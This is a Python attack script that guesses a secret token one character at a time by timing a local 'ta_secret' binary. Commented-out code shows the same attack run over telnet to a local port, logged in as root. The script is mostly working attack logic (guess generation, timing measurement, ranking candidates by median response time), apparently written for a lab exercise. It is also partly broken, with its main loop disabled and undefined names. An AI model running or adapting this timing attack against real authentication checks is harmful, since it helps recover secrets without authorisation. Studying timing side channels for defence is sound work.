import sys
import time
import string
import statistics

import subprocess

TELNET_HOST = "127.0.0.1"
TELNET_PORT = 5555
N = 1 # Number of requests to make for each guess
TOKEN_SIZE = 7 # Size of the token to guess
TA_APP = "ta_secret"  # Command to test the token
TA_COMMAND = "-a 0 0"


# Global child process 
child = None

# Custom exception for when the password is found
class PasswordFound(Exception):
    def __init__(self, password):
        self.password = password


def try_to_hack(characters):
    
    global child
    timings = []
    
    for _ in range(1):
        # try:
                       
            """ # Check if child is still alive
            if not child.isalive():
                print("[!] Session died, exiting...")
                timings.append(float('inf'))
                continue """
                        
            start = time.time()
            # child.sendline(f"{TA_COMMAND} {characters}")
            # child.expect("#")
            subprocess.call([TA_APP, TA_COMMAND, characters])
            end = time.time()
            timings.append(end - start)
            # output = child.before.decode("utf-8", errors="ignore")
            print(f"{TA_COMMAND} {characters}: time={end - start:.4f}")

            
            # Check if successful (adjust based on your app's output)
            # if ("success" in output.lower() or "correct" in output.lower()) and "wrong" not in output.lower():
            #     raise PasswordFound(characters)
            
        # except pexpect.TIMEOUT:
        #     print(f"Timeout during connection")
        #     timings.append(float('inf'))
        #     # Try to recover
        #     try:
        #         child.sendcontrol('c')
        #         child.expect("#", timeout=2)
        #     except:
        #         pass
        # except pexpect.EOF:
        #     print(f"Connection closed unexpectedly")
        #     timings.append(float('inf'))
        #     break
        # except PasswordFound:
        #     raise
        # except Exception as e:
        #     print(f"[!] Error: {e}")
        #     timings.append(float('inf'))
    
    return timings

def find_next_character(base):
   
    measures = []
    
    print(f"\n[*] Testing position {len(base) + 1}/{TOKEN_SIZE}")
    
    for c in string.printable:
        guess = base + c + 'a' * (TOKEN_SIZE - len(base) - 1)
        #print(f"\n[*] Trying: {guess}", end=' ', flush=True)
        
        times = try_to_hack(guess)
        
        # Filter out infinite times (failed connections)
        valid_times = [t for t in times if t != float('inf')]
        
        if valid_times:
            median_time = statistics.median(valid_times)
            min_time = min(valid_times)
            max_time = max(valid_times)
            stddev = statistics.stdev(valid_times) if len(valid_times) > 1 else 0
            
            measures.append({
                'char': c,
                'median': median_time,
                'min': min_time,
                'max': max_time,
                'stddev': stddev
            })
            
            #print(f"(median: {median_time:.4f}s)")
        else:
            print(f"(all failed)")
    
    print()  # New line after tests
    
    if not measures:
        print("\n[!] ERROR: All attempts failed.")
        sys.exit(1)
    
    # Sort by median time (descending - longer time suggests correct character)
    measures.sort(key=lambda x: x['median'], reverse=True)
    
    # Display top candidates
    print(f"[*] Top 5 candidates:")
    for i, m in enumerate(measures[:min(5, len(measures))]):
        print(f"    {i+1}. '{m['char']}': median={m['median']:.6f}s, "
              f"min={m['min']:.6f}s, max={m['max']:.6f}s, stddev={m['stddev']:.6f}s")
    
    best_char = measures[0]['char']
    second_best = measures[1]['median'] if len(measures) > 1 else 0
    diff = measures[0]['median'] - second_best
    
    print(f"[+] Selected: '{best_char}' (advantage: {diff:.6f}s)")
    
    return best_char

def main():
    global child
    
    # print("Starting timing attack on ta_secret")
    # print(f"Target: {TELNET_HOST}:{TELNET_PORT}")
    # print(f"Token size: {TOKEN_SIZE}")
    # print(f"Samples per guess: {N}")
    # print(f"Command: {TA_COMMAND}")
    
    # # Initial connection
    # print("\nConnecting.........\n")
    # try:
    #     child = pexpect.spawn(f"telnet {TELNET_HOST} {TELNET_PORT}", timeout=30)
        
    #     # Enable logging to stdout
    #     #child.logfile_read = sys.stdout.buffer
    
    #     child.sendline("")        
    #     child.expect("login:")
    #     child.sendline("root")

    #     print("\nlogged in\n")

    #     child.expect("#")

               
    # except Exception as e:
    #     print(f"Initial connection failed! : {e}")
    #     return
    
    base = ""
    print("will start to try to hack\n")
    
    try:
        # while len(base) < TOKEN_SIZE:
        next_char = find_next_character(base)
        base += next_char
        print(f"\nCurrent guess: {base}\n")
            
    except PasswordFound as pf:
        print(f"\nPassword found: {pf.password}")
        # Clean exit
        try:
            child.sendline("exit")
            child.expect(pexpect.EOF, timeout=2)
            child.close()
        except:
            pass
        return
    except KeyboardInterrupt:
        print(f"\nInterrupted by user")
        try:
            child.sendline("exit")
            child.close()
        except:
            pass
        return
    
    print(f"\nAttack complete. Guessed token: {base}")
    
    # Verify the guessed password
    print(f"\nVerifying guessed password: {base}")
    try:
        times = try_to_hack(base)
        valid = [t for t in times if t != float('inf')]
        if valid:
            avg_time = statistics.mean(valid)
            print(f"Average time: {avg_time:.4f}s ({len(valid)}/{N} successful)")
    except PasswordFound:
        print(f"Password verified: {base}")
    
    # Clean exit
    try:
        child.sendline("exit")
        child.expect(pexpect.EOF, timeout=2)
        child.close()
    except:
        pass

if __name__ == '__main__':
    main()